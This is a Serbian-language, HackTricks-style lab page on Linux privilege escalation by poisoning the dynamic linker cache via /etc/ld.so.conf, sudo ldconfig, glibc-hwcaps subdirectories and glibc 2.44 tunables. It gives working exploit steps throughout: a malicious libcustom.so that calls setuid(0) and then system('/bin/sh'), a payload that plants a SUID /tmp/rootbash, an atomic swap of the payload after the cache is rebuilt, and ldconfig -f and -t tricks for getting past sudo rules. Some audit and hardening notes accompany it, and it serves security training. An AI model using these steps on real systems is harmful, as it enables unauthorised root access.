# Primer za ld.so privesc exploit

{{#include ../../banners/hacktricks-training.md}}

Ova stranica je fokusirana laboratorijska vežba za trovanje **keša sistemskog linkera kroz `/etc/ld.so.conf` ili `ldconfig`**. Za injection biblioteka koje nedostaju, upisiv `RPATH`/`RUNPATH`, `LD_PRELOAD` i druge generičke SUID zloupotrebe linkera pogledajte [Zloupotreba SUID deljenih biblioteka i linkera](suid-shared-library-and-linker-abuse.md).

## Priprema okruženja

U sledećem odeljku možete pronaći kod datoteka koje ćemo koristiti za pripremu okruženja.

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Kreirajte** te fajlove na svojoj mašini u istoj fascikli
2. **Kompajlirajte** **biblioteku**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Kopirajte** `libcustom.so` u `/usr/lib` i osvežite keš: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privilegije)
4. **Kompajlirajte** **izvršnu datoteku**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Proverite okruženje

Proverite da li se _libcustom.so_ **učitava** iz _/usr/lib_ i da li možete da **izvršite** binarnu datoteku.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Korisne komande za trijažu

Prilikom napada na stvarnu metu, proverite **tačan naziv biblioteke** koji je binarnom fajlu potreban, šta loader **trenutno razrešava** i koje su konfigurisane putanje upisive, a da se pritom ne menja keš koji je u upotrebi.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
"$interp" --inhibit-cache --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
Koristite `ldd` samo na **pouzdanom** izvršnom fajlu. Neke implementacije ili neuobičajeni ELF interpreteri mogu prouzrokovati izvršavanje koda pod kontrolom napadača; `objdump -p ./file | grep NEEDED` bezbedno prikazuje direktne zavisnosti. Za pouzdanu metu, pozivanje otkrivenog interpretera sa `--list` prikazuje stvarno razrešavanje. Uporedite taj izlaz sa `--inhibit-cache --list`: razlika dokazuje da je `/etc/ld.so.cache`, a ne obično pravilo putanje pretrage, odabralo objekat.<sup>[[1]](#references)[[4]](#references)</sup>

Nekoliko korisnih zamki:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` obično **ne radi** zato što preusmeravanje izvršava vaša trenutna shell. Umesto toga koristite
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- **SUID/povlašćeni** binarni fajlovi rade u **secure-execution mode**: `LD_LIBRARY_PATH`
se ignoriše, dok je `LD_PRELOAD` ograničen (imena koja sadrže kosu crtu
se ignorišu, a unapred učitane mogu biti samo biblioteke označene setuid bitom u standardnim direktorijumima). Kada root pokrene `ldconfig`, direktorijumi navedeni u
`/etc/ld.so.conf` mogu dospeti u `/etc/ld.so.cache`, pa ova pogrešna konfiguracija
i dalje može uticati na privilegovane programe.<sup>[[1]](#references)[[2]](#references)</sup>
- `LD_DEBUG` se takođe ignoriše u secure-execution mode-u osim ako postoji `/etc/suid-debug`, zato njegov trag prikupljajte iz ekvivalentnog pokretanja koje nije SUID, umesto da očekujete izlaz iz privilegovanog izvršavanja.<sup>[[1]](#references)</sup>
- Na glibc 2.33 i novijim verzijama, dynamic loader takođe podržava
`--list-diagnostics`, koji prikazuje mašinski čitljivu dijagnostiku loadera i ugrađene informacije o putanjama pretrage kada hijacking ne funkcioniše očekivano.<sup>[[1]](#references)[[6]](#references)</sup>

### Ograničenja cache-a i SONAME-a

`ldconfig` ne kešira svaki proizvoljni fajl u konfigurisanom direktorijumu: ispituje ELF zaglavlja, prepoznaje imena koja odgovaraju obrascu `lib*.so*` ili `ld-*.so*` i očekuje uobičajeni lanac `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. Zbog toga ubačeni objekat mora imati ciljnu arhitekturu/klasu, tačno `DT_NEEDED` ime (obično njegov `DT_SONAME`) i sve simbole/verzije koje žrtva razrešava.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Dajte prednost biblioteci specifičnoj za cilj, kao u ovom primeru. Zasenjivanje uobičajenog SONAME-a nepotpunim objektom može pokvariti svaki proces koji ga razreši pre nego što se pokrene predviđeni privilegovani cilj.<sup>[[3]](#references)</sup>

### Perzistencija keširane putanje i atomske zamene

Keš beleži mapiranje **imena biblioteke na putanju**; on ne sadrži sam shared object. Nakon što se putanja pod kontrolom napadača kešira, zamena objekta na toj tačnoj putanji utiče na novopokrenute procese bez ponovnog pokretanja `ldconfig`. Ovo omogućava koristan obrazac provere pre korišćenja: izložite validnu biblioteku tokom administratorovog ponovnog izgrađivanja ili pregleda keša, a zatim atomski preimenujte payload preko nje. Postojeći procesi zadržavaju objekat koji su već mapirali.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
cache_path=$("$interp" --list ./sharedvuln | awk '/libcustom\.so/{print $3; exit}')
cp ./payload.so "${cache_path}.new"
mv -f "${cache_path}.new" "$cache_path"
```
Isto tako, brisanje zlonamerne linije iz `ld.so.conf` samo po sebi ne uklanja već upisanu stavku: administrator mora da ukloni nepouzdani objekat, ispravi vlasništvo/pristup za upis i ponovo izgradi keš. Koristite poređenje `--inhibit-cache` iznad da biste razlikovali zastarelu stavku u kešu od i dalje aktivne putanje konfiguracije.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit

U ovom scenariju pretpostavimo da je administrator dodao ranjivu stavku u
datoteku unutar `/etc/ld.so.conf.d/` koju uključuje sistemski
`/etc/ld.so.conf`.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Ranjivi direktorijum je _/home/ubuntu/lib_ (gde imamo pristup za upis).\
**Preuzmite i kompajlirajte** sledeći kod unutar te putanje:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Ako očekujete da će **root** (ili drugi privilegovani nalog) kasnije izvršiti ranjivi binary, obično je bolje ostaviti **root-owned artifact** umesto pokretanja interaktivnog shell-a. Na primer:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Zatim, nakon što se izvršavanje sa privilegijama obavi, možete koristiti `/tmp/rootbash -p`.

Sada kada smo **kreirali zlonamernu libcustom biblioteku unutar pogrešno konfigurisane** putanje, podrazumevani keš mora biti ponovo izgrađen uspešnim pokretanjem **`ldconfig`** sa privilegijama. Ponovno pokretanje sistema pomaže samo tamo gde ga lokalni proces pokretanja zaista poziva; u suprotnom sačekajte administratorsku radnju ili iskoristite nebezbedno sudo pravilo ako je dostupno.<sup>[[2]](#references)</sup>

Kada se to dogodi, **ponovo proverite** odakle izvršna datoteka `sharedvuln` učitava biblioteku `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Kao što možete videti, **učitava ga iz `/home/ubuntu/lib`**, a ako ga bilo koji korisnik izvrši, biće pokrenut shell:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Imajte na umu da u ovom primeru nismo eskalirali privilegije, ali ako izmenimo izvršene komande i **sačekamo da root ili drugi privilegovani korisnik izvrši ranjivi binarni fajl**, moći ćemo da eskaliramo privilegije.

### Moderno `glibc-hwcaps` shadowing

Od glibc 2.33, loader može da preferira optimizovane biblioteke unutar `glibc-hwcaps/<level>/` u okviru **svakog direktorijuma za pretragu biblioteka**. Zato provera samo `/home/ubuntu/lib` nije dovoljna: kompatibilni poddirektorijum sa dozvolom upisivanja, kao što je `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`, može da zaseni osnovnu biblioteku nakon što je `ldconfig` indeksira, dok drugi CPU-ovi nastavljaju da koriste osnovni objekat. Ovo takođe omogućava hijacking selektivan po arhitekturi, koji može biti propušten kada se validacija obavlja na drugom CPU-u.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Trenutne smernice za hardening glibc-a preporučuju izbegavanje duplikata SONAME vrednosti, nestandardnih lokacija za pretragu i objekata u `glibc-hwcaps` poddirektorijumima. Iz perspektive audita, rekurzivno proverite vlasništvo i dozvole za pisanje nad konfigurisanim direktorijumima i svim komponentama njihove putanje.<sup>[[3]](#references)</sup>

### Druge pogrešne konfiguracije - Ista ranjivost

U prethodnom primeru smo lažirali pogrešnu konfiguraciju u kojoj je administrator **postavio folder bez privilegija unutar konfiguracione datoteke u `/etc/ld.so.conf.d/`**.\
Ali postoje i druge pogrešne konfiguracije koje mogu izazvati istu ranjivost: ako imate **dozvole za pisanje** u učitanu **konfiguracionu datoteku**, možete kreirati datoteku u direktorijumu `/etc/ld.so.conf.d/` sa dozvolom za pisanje ili možete pisati u `/etc/ld.so.conf`, možete konfigurisati i iskoristiti istu ranjivost.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**Pretpostavimo da imate sudo privilegije nad `ldconfig`**. `ldconfig` prihvata direktorijume za skeniranje kao pozicione argumente, pa je najkraći oblik trovanja keša često jednostavno:<sup>[[2]](#references)</sup>
```bash
sudo ldconfig /tmp
```
Alternativno, `-f` bira drugu konfiguracionu datoteku uz zadržavanje podrazumevanog izlaza keša. Ovo je korisno kada filter argumenata blokira pozicione direktorijume, ali i dalje dozvoljava `-f`, ili kada treba ubaciti nekoliko putanja:<sup>[[2]](#references)</sup>
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Sada, kao što je navedeno u **prethodnom exploit-u**, **kreirajte malicioznu biblioteku unutar `/tmp`**.\
I na kraju, učitajmo putanju i proverimo odakle binary učitava biblioteku:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Kao što možete videti, ako imate sudo privilegije nad `ldconfig`, možete iskoristiti istu ranjivost.** Detalji opcija su važni pri proceni ograničenog sudo pravila: `-f` bira drugu konfiguraciju, ali i dalje ponovo izgrađuje `/etc/ld.so.cache`; `-C` preusmerava keš na drugo mesto; `-N` sprečava ponovnu izgradnju keša; a `-X` sprečava ažuriranje linkova, ali **i dalje ponovo izgrađuje keš osim ako se koristi zajedno sa `-N`**. `-n` podrazumeva `-N`, pa može da ažurira linkove u prosleđenim direktorijumima, ali ne može da truje keš; `-r` radi ispod alternativnog root direktorijuma i obično ne menja keš na hostu.<sup>[[2]](#references)</sup>

## glibc 2.44: sistemski keširani tunables

Počev od glibc 2.44, `ldconfig` takođe parsira `/etc/tunables.conf` i čuva njegova podešavanja kao proširenje u `/etc/ld.so.cache`. Datoteka prihvata `include` direktive i filtere po procesu. Prefiksi kontrolišu opseg: `@` cilja samo `AT_SECURE` procese, `$` ih izuzima, a `*` obuhvata oba tipa. Time se granica revizije proširuje izvan direktorijuma biblioteka: konfiguracija tunables sa dozvolom upisa ili uključena datoteka može uticati na buduća pokretanja programa nakon privilegovanog ponovnog izgrađivanja keša.<sup>[[7]](#references)</sup>

Isto izdanje dodaje `ldconfig -t TUNCONF`, koji bira alternativnu datoteku tunables, ali i dalje upisuje u uobičajeni keš, osim ako ga druga opcija ne preusmeri. Zbog toga wrapperi i sudo pravila koja su pokušavala da blokiraju samo `-f` moraju takođe da odbiju `-t`, proizvoljne pozicione direktorijume i manipulaciju izlazom keša.<sup>[[7]](#references)[[8]](#references)</sup>
```bash
# Detection / lab-only proof of cache influence
find /etc/tunables.conf -writable -ls 2>/dev/null
grep -nE '^[[:space:]]*include' /etc/tunables.conf 2>/dev/null
ldconfig --help | grep -E 'TUNCONF|tunables'
printf '*glibc.malloc.check=3\n' > /tmp/evil.tunconf
sudo ldconfig -t /tmp/evil.tunconf
"$interp" --list-tunables | grep -F glibc.malloc.check
sudo ldconfig                         # rebuild from the real configuration
```
Ovo nije automatsko izvršavanje proizvoljnog koda. To je privilegovani primitiv za **loader-behavior manipulation**: glibc izričito upozorava da sistemske vrednosti mogu primeniti bezbednosno osetljive `tunables` na `setuid/setgid` programe bez bezbednosne provere pojedinačnih `tunables`. Izlistajte stvarne `tunables` na hostu pomoću `--list-tunables` i potražite promene allocator-a specifične za cilj, promene CPU-hardening-a ili uslove za denial-of-service, umesto da pretpostavljate univerzalni payload.<sup>[[7]](#references)</sup>



## References

- [1] [ld.so(8) - Linux stranica priručnika](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Linux stranica priručnika](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Ojačavanje dynamic linker-a - GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Linux stranica priručnika](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Dijagnostika dynamic linker-a (GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
- [7] [Sistemski `tunables` (GNU C Library 2.44)](https://sourceware.org/glibc/manual/2.44/html_node/System_002dwide-Tunables.html)
- [8] [Dodavanje sistemskih `tunables`: ldconfig deo (patch v6 1/4)](https://sourceware.org/pipermail/libc-alpha/2026-March/175984.html)
{{#include ../../banners/hacktricks-training.md}}
